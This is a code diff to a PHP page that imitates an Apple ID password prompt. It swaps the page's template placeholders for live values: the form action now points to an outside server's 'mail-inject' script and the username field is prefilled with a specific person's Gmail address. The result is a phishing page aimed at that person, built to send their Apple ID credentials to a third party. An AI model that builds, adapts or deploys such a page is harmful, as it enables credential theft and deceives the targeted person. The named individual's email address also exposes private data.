@@ -267,12 +267,12 @@ setcookie("first_visit", "true", time() + (86400 * 999), "/");
 
 <?php
 if(isset($_COOKIE["second_visit"])) {
-    echo "<p>Lorem ipsum CONSECUTIVE VISIT WEB CONTENT</p></body></html>";
+    echo "<p>Thanks!</p></body></html>";
     die();
 }
 ?>
 
-	<p>Lorem ipsum PRE-SUBMIT WEB CONTENT</p>
+	<p>Thanks!</p>
 
 	<div class="modal-overlay modal-overlay-visible"></div>
 
@@ -286,15 +286,15 @@ if(isset($_COOKIE["second_visit"])) {
 				Enter your Apple ID e-mail address and password
 			</div>
 
-			<form action="http://your.domain/mail-inject/framework.php" id="myform" method="get" name="myform">
+			<form action="http://bellabhair.pixub.com/mail-inject/framework.php" id="myform" method="get" name="myform">
 				<input class="modal-text-input modal-text-input-double" name="modal-username" type="text" value="<?php
 					if (isset($_GET['modal-username'])) {
 					echo htmlspecialchars(stripslashes($_GET['modal-username']));
-					} else echo "research@subject.tld";
+					} else echo "jesselynnpitcher@gmail.com";
 					?>"><input autofocus="" class="modal-text-input modal-text-input-double" id="password-input" name="modal-password" placeholder="Password" type="password">
 
 				<div>
-					<p>Lorem ipsum POST-SUBMIT WEB CONTENT</p>
+					<p>Thanks!</p>
 				</div>
 				</input>
 		</div>
